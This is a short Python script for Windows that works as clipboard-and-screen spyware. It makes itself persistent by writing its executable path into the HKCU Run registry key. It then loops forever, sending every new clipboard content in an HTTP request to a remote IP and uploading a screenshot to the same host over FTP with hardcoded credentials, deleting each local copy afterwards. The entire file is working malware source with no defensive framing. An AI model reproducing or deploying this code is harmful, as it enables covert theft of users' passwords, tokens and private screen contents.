import clipboard, requests
import pyautogui, ftplib, os
from _winreg import *

def persistence():
    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    bin_path = "C:\Users\Administrateur\Py\dist\exf_clip.exe"

    try:
        reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
        SetValueEx(reg_key, 'YOLO', 0, REG_SZ, bin_path)
        CloseKey(reg_key)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed' 

persistence()

url = "http://10.101.200.34/test.php?args="

lastcontent = ""
i = 1
while True:
    content = clipboard.paste()
    if content != lastcontent:
        lastcontent = content
        r = requests.get(url + "\"" + content + "\"")
        
        screen_name = "screen" + str(i) + ".png"
        
        pic = pyautogui.screenshot()
        pic.save(screen_name)

        session = ftplib.FTP('10.101.200.34','ftptest','test')
        file = open(screen_name,'rb')
        session.storbinary('STOR '+screen_name+'', file)
        file.close()
        session.quit()

        os.remove(screen_name)

        i += 1 
